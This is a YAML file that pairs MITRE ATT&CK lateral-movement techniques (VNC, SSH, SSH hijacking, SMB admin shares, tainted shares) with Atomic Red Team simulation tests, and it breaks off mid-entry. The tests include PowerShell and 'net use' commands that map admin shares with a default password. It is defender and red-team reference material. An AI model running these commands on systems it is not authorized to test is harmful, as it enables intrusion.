lateral-movement:
  T1021.005:
    technique:
      modified: '2023-03-30T21:01:46.879Z'
      name: VNC
      description: |-
        Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely control machines using Virtual Network Computing (VNC).  VNC is a platform-independent desktop sharing system that uses the RFB (â€œremote framebufferâ€?) protocol to enable users to remotely control another computerâ€™s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation: The Remote Framebuffer Protocol)

        VNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) as VNC is screen-sharing software rather than resource-sharing software. By default, VNC uses the system's authentication, but it can be configured to use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation: VNC Authentication)

        Adversaries may abuse VNC to perform malicious actions as the logged-on user such as opening documents, downloading files, and running arbitrary commands. An adversary could use VNC to remotely control and monitor a system to collect data and information to pivot to other systems within the network. Specific VNC libraries/implementations have also been susceptible to brute force attacks and memory usage exploitation.(Citation: Hijacking VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation: Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: |-
        Use of VNC may be legitimate depending on the environment and how itâ€™s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior using VNC.

        On macOS systems <code>log show --predicate 'process = "screensharingd" and eventMessage contains "Authentication:"'</code> can be used to review incoming VNC connection attempts for suspicious activity.(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)

        Monitor for use of built-in debugging environment variables (such as those containing credentials or other sensitive information) as well as test/default users on VNC servers, as these can leave openings for adversaries to abuse.(Citation: Gnome Remote Desktop grd-settings)(Citation: Gnome Remote Desktop gschema)
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'Logon Session: Logon Session Creation'
      - 'Network Traffic: Network Connection Creation'
      - 'Process: Process Creation'
      x_mitre_system_requirements:
      - VNC server installed and listening for connections.
      type: attack-pattern
      id: attack-pattern--01327cde-66c4-4123-bf34-5f258d59457b
      created: '2020-02-11T18:28:44.950Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1021/005
        external_id: T1021.005
      - source_name: The Remote Framebuffer Protocol
        description: T. Richardson, J. Levine, RealVNC Ltd.. (2011, March). The Remote
          Framebuffer Protocol. Retrieved September 20, 2021.
        url: https://datatracker.ietf.org/doc/html/rfc6143#section-7.2.2
      - source_name: MacOS VNC software for Remote Desktop
        description: Apple Support. (n.d.). Set up a computer running VNC software
          for Remote Desktop. Retrieved August 18, 2021.
        url: https://support.apple.com/guide/remote-desktop/set-up-a-computer-running-vnc-software-apdbed09830/mac
      - source_name: VNC Authentication
        description: Tegan. (2019, August 15). Setting up System Authentication. Retrieved
          September 20, 2021.
        url: https://help.realvnc.com/hc/en-us/articles/360002250097-Setting-up-System-Authentication
      - source_name: Hijacking VNC
        description: 'Z3RO. (2019, March 10). Day 70: Hijacking VNC (Enum, Brute,
          Access and Crack). Retrieved September 20, 2021.'
        url: https://int0x33.medium.com/day-70-hijacking-vnc-enum-brute-access-and-crack-d3d18a4601cc
      - source_name: macOS root VNC login without authentication
        description: Nick Miles. (2017, November 30). Detecting macOS High Sierra
          root account without authentication. Retrieved September 20, 2021.
        url: https://www.tenable.com/blog/detecting-macos-high-sierra-root-account-without-authentication
      - source_name: VNC Vulnerabilities
        description: Sergiu Gatlan. (2019, November 22). Dozens of VNC Vulnerabilities
          Found in Linux, Windows Solutions. Retrieved September 20, 2021.
        url: https://www.bleepingcomputer.com/news/security/dozens-of-vnc-vulnerabilities-found-in-linux-windows-solutions/
      - source_name: Offensive Security VNC Authentication Check
        description: Offensive Security. (n.d.). VNC Authentication. Retrieved October
          6, 2021.
        url: https://www.offensive-security.com/metasploit-unleashed/vnc-authentication/
      - source_name: Attacking VNC Servers PentestLab
        description: Administrator, Penetration Testing Lab. (2012, October 30). Attacking
          VNC Servers. Retrieved October 6, 2021.
        url: https://pentestlab.blog/2012/10/30/attacking-vnc-servers/
      - source_name: Havana authentication bug
        description: Jay Pipes. (2013, December 23). Security Breach! Tenant A is
          seeing the VNC Consoles of Tenant B!. Retrieved October 6, 2021.
        url: http://lists.openstack.org/pipermail/openstack/2013-December/004138.html
      - source_name: Apple Unified Log Analysis Remote Login and Screen Sharing
        description: 'Sarah Edwards. (2020, April 30). Analysis of Apple Unified Logs:
          Quarantine Edition [Entry 6] â€“ Working From Home? Remote Logins. Retrieved
          August 19, 2021.'
        url: https://sarah-edwards-xzkc.squarespace.com/blog/2020/4/30/analysis-of-apple-unified-logs-quarantine-edition-entry-6-working-from-home-remote-logins
      - source_name: Gnome Remote Desktop grd-settings
        description: Pascal Nowack. (n.d.). Retrieved September 21, 2021.
        url: https://gitlab.gnome.org/GNOME/gnome-remote-desktop/-/blob/9aa9181e/src/grd-settings.c#L207
      - source_name: Gnome Remote Desktop gschema
        description: Pascal Nowack. (n.d.). Retrieved September 21, 2021.
        url: https://gitlab.gnome.org/GNOME/gnome-remote-desktop/-/blob/9aa9181e/src/org.gnome.desktop.remote-desktop.gschema.xml.in
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
    atomic_tests: []
  T1080:
    technique:
      modified: '2023-03-30T21:01:36.145Z'
      name: Taint Shared Content
      description: |2-

        Adversaries may deliver payloads to remote systems by adding content to shared storage locations, such as network drives or internal code repositories. Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.

        A directory share pivot is a variation on this technique that uses several other techniques to propagate malware when users access a shared network directory. It uses [Shortcut Modification](https://attack.mitre.org/techniques/T1547/009) of directory .LNK files that use [Masquerading](https://attack.mitre.org/techniques/T1036) to look like the real directories, which are hidden through [Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001). The malicious .LNK-based directories have an embedded command that executes the hidden malware file in the directory and then opens the real intended directory so that the user's expected action still occurs. When used with frequently used network directories, the technique may result in frequent reinfections and broad access to systems and potentially to new and higher privileged accounts. (Citation: Retwin Directory Share Pivot)

        Adversaries may also compromise shared network directories through binary infections by appending or prepending its code to the healthy binary on the shared network directory. The malware may modify the original entry point (OEP) of the healthy binary to ensure that it is executed before the legitimate code. The infection could continue to spread via the newly infected file when it is executed by a remote system. These infections may target both binary and non-binary formats that end with extensions including, but not limited to, .EXE, .DLL, .SCR, .BAT, and/or .VBS.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_contributors:
      - Michal Dida, ESET
      - David Routin
      x_mitre_detection: |-
        Processes that write or overwrite many files to a network shared directory may be suspicious. Monitor processes that are executed from removable media for malicious or abnormal activity such as network connections due to Command and Control and possible network Discovery techniques.

        Frequently scan shared network directories for malicious files, hidden files, .LNK files, and other file types that may not typical exist in directories used to share specific types of content.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - Office 365
      - SaaS
      - Linux
      - macOS
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Network Share: Network Share Access'
      - 'Process: Process Creation'
      - 'File: File Creation'
      - 'File: File Modification'
      x_mitre_permissions_required:
      - User
      x_mitre_system_requirements:
      - Access to shared folders and content with write permissions
      type: attack-pattern
      id: attack-pattern--246fd3c7-f5e3-466d-8787-4c13d9e3b61c
      created: '2017-05-31T21:31:01.759Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1080
        external_id: T1080
      - source_name: Retwin Directory Share Pivot
        description: Routin, D. (2017, November 13). Abusing network shares for efficient
          lateral movements and privesc (DirSharePivot). Retrieved April 12, 2018.
        url: https://rewtin.blogspot.ch/2017/11/abusing-user-shares-for-efficient.html
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1527:
    technique:
      x_mitre_platforms:
      - SaaS
      - Office 365
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Jen Burns, HubSpot
      - Mark Wee
      - Jeff Sakowicz, Microsoft Identity Developer Platform Services (IDPM Services)
      - Saisha Agrawal, Microsoft Threat Intelligent Center (MSTIC)
      - Shailesh Tiwary (Indian Army)
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--27960489-4e7f-461d-a62a-f5c0cb521e4a
      type: attack-pattern
      created: '2019-08-30T12:55:58.607Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - url: https://attack.mitre.org/techniques/T1527
        external_id: T1527
        source_name: mitre-attack
      - description: Auth0. (n.d.). Why You Should Always Use Access Tokens to Secure
          APIs. Retrieved September 12, 2019.
        url: https://auth0.com/blog/why-should-use-accesstokens-to-secure-an-api/
        source_name: Auth0 - Why You Should Always Use Access Tokens to Secure APIs
          Sept 2019
      - description: okta. (n.d.). What Happens If Your JWT Is Stolen?. Retrieved
          September 12, 2019.
        url: https://developer.okta.com/blog/2018/06/20/what-happens-if-your-jwt-is-stolen
        source_name: okta
      - description: Cai, S., Flores, J., de Guzman, C., et. al.. (2019, August 27).
          Microsoft identity platform access tokens. Retrieved October 4, 2019.
        url: https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens
        source_name: Microsoft Identity Platform Access 2019
      - description: Stalmans, E.. (2017, August 2). Phishing with OAuth and o365/Azure.
          Retrieved October 4, 2019.
        url: https://staaldraad.github.io/2017/08/02/o356-phishing-with-oauth/
        source_name: Staaldraad Phishing with OAuth 2017
      modified: '2021-09-20T16:50:41.832Z'
      name: Application Access Token
      description: |
        Adversaries may use application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.

        Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019) OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)

        For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a "refresh" token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)

        Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victimâ€™s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: Monitor access token activity for abnormal use and permissions
        granted to unusual or suspicious applications. Administrators can set up a
        variety of logs and leverage audit tools to monitor actions that can be conducted
        as a result of OAuth 2.0 access. For instance, audit reports enable admins
        to identify privilege escalation actions such as role creations or policy
        modifications, which could be actions performed after initial access.
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_defense_bypassed:
      - Multi-Factor Authentication
      - Logon Credentials
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1021.004:
    technique:
      modified: '2023-03-30T21:01:49.323Z'
      name: SSH
      description: |-
        Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.

        SSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the userâ€™s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: |-
        Use of SSH may be legitimate depending on the environment and how itâ€™s used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with SSH. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.

        On macOS systems <code>log show --predicate 'process = "sshd"'</code> can be used to review incoming SSH connection attempts for suspicious activity. The command <code>log show --info --predicate 'process = "ssh" or eventMessage contains "ssh"'</code> can be used to review outgoing SSH connection activity.(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)

        On Linux systems SSH activity can be found in the logs located in <code>/var/log/auth.log</code> or <code>/var/log/secure</code> depending on the distro you are using.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Linux
      - macOS
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Network Traffic: Network Connection Creation'
      - 'Logon Session: Logon Session Creation'
      x_mitre_system_requirements:
      - An SSH server is configured and running.
      type: attack-pattern
      id: attack-pattern--2db31dcd-54da-405d-acef-b9129b816ed6
      created: '2020-02-11T18:27:15.774Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1021/004
        external_id: T1021.004
      - source_name: Apple Unified Log Analysis Remote Login and Screen Sharing
        description: 'Sarah Edwards. (2020, April 30). Analysis of Apple Unified Logs:
          Quarantine Edition [Entry 6] â€“ Working From Home? Remote Logins. Retrieved
          August 19, 2021.'
        url: https://sarah-edwards-xzkc.squarespace.com/blog/2020/4/30/analysis-of-apple-unified-logs-quarantine-edition-entry-6-working-from-home-remote-logins
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
    atomic_tests: []
  T1017:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--327f3cc5-eea1-42d4-a6cd-ed34b7ce8f61
      type: attack-pattern
      created: '2017-05-31T21:30:27.755Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1017
        external_id: T1017
      - external_id: CAPEC-187
        source_name: capec
        url: https://capec.mitre.org/data/definitions/187.html
      modified: '2020-03-23T15:40:50.965Z'
      name: Application Deployment Software
      description: |-
        Adversaries may deploy malicious software to systems within a network using application deployment systems employed by enterprise administrators. The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment.

        Access to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: Monitor application deployments from a secondary system.
        Perform application deployment at regular times so that irregular deployment
        activity stands out. Monitor process activity that does not correlate to known
        good software. Monitor account login activity on the deployment system.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_system_requirements:
      - Access to application deployment software (EPO, HPCA, Altiris, etc.)
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1091:
    technique:
      modified: '2022-10-21T19:14:13.179Z'
      name: Replication Through Removable Media
      description: |-
        Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.

        Mobile devices may also be used to infect PCs with malware if connected via USB.(Citation: Exploiting Smartphone USB ) This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.(Citation: Windows Malware Infecting Android)(Citation: iPhone Charging Cable Hack) For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_detection: Monitor file access on removable media. Detect processes
        that execute from removable media after it is mounted or when initiated by
        a user. If a remote access tool is used in this manner to move laterally,
        then additional actions are likely to occur after execution, such as opening
        network connections for Command and Control and system and network information
        Discovery.
      x_mitre_platforms:
      - Windows
      x_mitre_is_subtechnique: false
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '1.2'
      x_mitre_contributors:
      - Joas Antonio dos Santos, @Cr4zyC0d3
      x_mitre_data_sources:
      - 'File: File Access'
      - 'File: File Creation'
      - 'Process: Process Creation'
      - 'Drive: Drive Creation'
      x_mitre_system_requirements:
      - Removable media allowed, Autorun enabled or vulnerability present that allows
        for code execution
      type: attack-pattern
      id: attack-pattern--3b744087-9945-4a6f-91e8-9dbceda417a4
      created: '2017-05-31T21:31:08.977Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1091
        external_id: T1091
      - source_name: Windows Malware Infecting Android
        description: Lucian Constantin. (2014, January 23). Windows malware tries
          to infect Android devices connected to PCs. Retrieved May 25, 2022.
        url: https://www.computerworld.com/article/2486903/windows-malware-tries-to-infect-android-devices-connected-to-pcs.html
      - source_name: iPhone Charging Cable Hack
        description: Zack Whittaker. (2019, August 12). This hackerâ€™s iPhone charging
          cable can hijack your computer. Retrieved May 25, 2022.
        url: https://techcrunch.com/2019/08/12/iphone-charging-cable-hack-computer-def-con/
      - source_name: 'Exploiting Smartphone USB '
        description: Zhaohui Wang & Angelos Stavrou. (n.d.). Exploiting Smart-Phone
          USB Connectivity For Fun And Profit. Retrieved May 25, 2022.
        url: https://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.226.3427&rep=rep1&type=pdf
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1091
    atomic_tests:
    - name: USB Malware Spread Simulation
      auto_generated_guid: d44b7297-622c-4be8-ad88-ec40d7563c75
      description: "Simulates an adversary copying malware to all connected removable
        drives. \n"
      supported_platforms:
      - windows
      executor:
        name: powershell
        command: |
          $RemovableDrives=@()
          $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID
          ForEach ($Drive in $RemovableDrives)
          {
          write-host "Removable Drive Found:" $Drive
          New-Item -Path $Drive/T1091Test1.txt -ItemType "file" -Force -Value "T1091 Test 1 has created this file to simulate malware spread to removable drives."
          }
        cleanup_command: |
          $RemovableDrives = Get-WmiObject -Class Win32_LogicalDisk -filter "drivetype=2" | select-object -expandproperty DeviceID
          ForEach ($Drive in $RemovableDrives)
          {
          Remove-Item -Path $Drive\T1091Test1.txt -Force -ErrorAction Ignore
          }
  T1563.001:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Anastasios Pingios
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--4d2a5b3e-340d-4600-9123-309dd63c9bf8
      type: attack-pattern
      created: '2020-02-25T18:34:38.290Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1563.001
        url: https://attack.mitre.org/techniques/T1563/001
      - url: https://www.slideshare.net/morisson/mistrusting-and-abusing-ssh-13526219
        description: Duarte, H., Morrison, B. (2012). (Mis)trusting and (ab)using
          ssh. Retrieved January 8, 2018.
        source_name: Slideshare Abusing SSH
      - url: https://www.blackhat.com/presentations/bh-usa-05/bh-us-05-boileau.pdf
        description: 'Adam Boileau. (2005, August 5). Trust Transience:  Post Intrusion
          SSH Hijacking. Retrieved December 19, 2017.'
        source_name: SSHjack Blackhat
      - url: https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking
        description: Beuchler, B. (2012, September 28). SSH Agent Hijacking. Retrieved
          December 20, 2017.
        source_name: Clockwork SSH Agent Hijacking
      - source_name: Breach Post-mortem SSH Hijack
        url: https://matrix.org/blog/2019/05/08/post-mortem-and-remediations-for-apr-11-security-incident
        description: Hodgson, M. (2019, May 8). Post-mortem and remediations for Apr
          11 security incident. Retrieved February 17, 2020.
      modified: '2020-03-23T23:11:24.682Z'
      name: SSH Hijacking
      description: |-
        Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.

        In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.(Citation: Slideshare Abusing SSH)(Citation: SSHjack Blackhat)(Citation: Clockwork SSH Agent Hijacking)(Citation: Breach Post-mortem SSH Hijack)

        [SSH Hijacking](https://attack.mitre.org/techniques/T1563/001) differs from use of [SSH](https://attack.mitre.org/techniques/T1021/004) because it hijacks an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: Use of SSH may be legitimate, depending upon the network
        environment and how it is used. Other factors, such as access patterns and
        activity that occurs after a remote login, may indicate suspicious or malicious
        behavior with SSH. Monitor for user accounts logged into systems they would
        not normally access or access patterns to multiple systems over a relatively
        short period of time. Also monitor user SSH-agent socket files being used
        by different users.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Logon Session: Logon Session Creation'
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Traffic Flow'
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      x_mitre_permissions_required:
      - root
      x_mitre_system_requirements:
      - SSH service enabled, trust relationships configured, established connections
    atomic_tests: []
  T1021.002:
    technique:
      modified: '2023-04-03T18:57:59.554Z'
      name: 'Remote Services: SMB/Windows Admin Shares'
      description: |-
        Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.

        SMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.

        Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078) to remotely access a networked system over SMB,(Citation: Wikipedia Server Message Block) to interact with systems using remote procedure calls (RPCs),(Citation: TechNet RPC) transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can also use NTLM hashes to access administrator shares on systems with [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration and patch levels.(Citation: Microsoft Admin Shares)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_deprecated: false
      x_mitre_detection: 'Ensure that proper logging of accounts used to log into
        systems is turned on and centrally collected. Windows logging is able to collect
        success/failure for accounts that may be used to move laterally and can be
        collected using tools such as Windows Event Forwarding. (Citation: Lateral
        Movement Payne)(Citation: Windows Event Forwarding Payne) Monitor remote login
        events and associated SMB activity for file transfers and remote process execution.
        Monitor the actions of remote users who connect to administrative shares.
        Monitor for use of tools and commands to connect to remote shares, such as
        [Net](https://attack.mitre.org/software/S0039), on the command-line interface
        and Discovery techniques that could be used to find remotely accessible systems.(Citation:
        Medium Detecting WMI Persistence)'
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Windows
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'Logon Session: Logon Session Creation'
      - 'Network Traffic: Network Connection Creation'
      - 'Network Traffic: Network Traffic Flow'
      - 'Network Share: Network Share Access'
      - 'Command: Command Execution'
      x_mitre_system_requirements:
      - SMB enabled; Host/network firewalls not blocking SMB ports between source
        and destination; Use of domain account in administrator group on remote system
        or default system admin account.
      type: attack-pattern
      id: attack-pattern--4f9ca633-15c5-463c-9724-bdcd54fde541
      created: '2020-02-11T18:25:28.212Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1021/002
        external_id: T1021.002
      - source_name: Medium Detecting WMI Persistence
        description: French, D. (2018, October 9). Detecting & Removing an Attackerâ€™s
          WMI Persistence. Retrieved October 11, 2019.
        url: https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96
      - source_name: TechNet RPC
        description: Microsoft. (2003, March 28). What Is RPC?. Retrieved June 12,
          2016.
        url: https://technet.microsoft.com/en-us/library/cc787851.aspx
      - source_name: Microsoft Admin Shares
        description: Microsoft. (n.d.). How to create and delete hidden or administrative
          shares on client computers. Retrieved November 20, 2014.
        url: http://support.microsoft.com/kb/314984
      - source_name: Windows Event Forwarding Payne
        description: Payne, J. (2015, November 23). Monitoring what matters - Windows
          Event Forwarding for everyone (even if you already have a SIEM.). Retrieved
          February 1, 2016.
        url: https://docs.microsoft.com/en-us/archive/blogs/jepayne/monitoring-what-matters-windows-event-forwarding-for-everyone-even-if-you-already-have-a-siem
      - source_name: Lateral Movement Payne
        description: Payne, J. (2015, November 26). Tracking Lateral Movement Part
          One - Special Groups and Specific Service Accounts. Retrieved February 1,
          2016.
        url: https://docs.microsoft.com/en-us/archive/blogs/jepayne/tracking-lateral-movement-part-one-special-groups-and-specific-service-accounts
      - source_name: Wikipedia Server Message Block
        description: Wikipedia. (2017, December 16). Server Message Block. Retrieved
          December 21, 2017.
        url: https://en.wikipedia.org/wiki/Server_Message_Block
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1021.002
    atomic_tests:
    - name: Map admin share
      auto_generated_guid: 3386975b-367a-4fbb-9d77-4dcf3639ffd3
      description: 'Connecting To Remote Shares

        '
      supported_platforms:
      - windows
      input_arguments:
        user_name:
          description: Username
          type: string
          default: DOMAIN\Administrator
        share_name:
          description: Examples C$, IPC$, Admin$
          type: string
          default: C$
        password:
          description: Password
          type: string
          default: P@ssw0rd1
        computer_name:
          description: Target Computer Name
          type: string
          default: Target
      executor:
        command: 'cmd.exe /c "net use \\#{computer_name}\#{share_name} #{password}
          /u:#{user_name}"

          '
        name: command_prompt
    - name: Map Admin Share PowerShell
      auto_generated_guid: 514e9cd7-9207-4882-98b1-c8f791bae3c5
      description: 'Map Admin share utilizing PowerShell

        '
      supported_platforms:
      - windows
      input_arguments:
        share_name:
          description: Examples C$, IPC$, Admin$
          type: string
          default: C$
        map_name:
          description: Mapped Drive Letter
          type: string
          default: g
        computer_name:
          description: Target Computer Name
          type: string
          default: Target
      executor:
        command: 'New-PSDrive -name #{map_name} -psprovider filesystem -root \\#{computer_name}\#{share_name}

          '
        name: powershell
    - name: Copy and Execute File with PsExec
      auto_generated_guid: 0eb03d41-79e4-4393-8e57-6344856be1cf
      description: 'Copies a file to a remote host and executes it using PsExec. Requires
        the download of PsExec from [https://docs.microsoft.com/en-us/sysinternals/downloads/psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).

        '
      supported_platforms:
      - windows
      input_arguments:
        command_path:
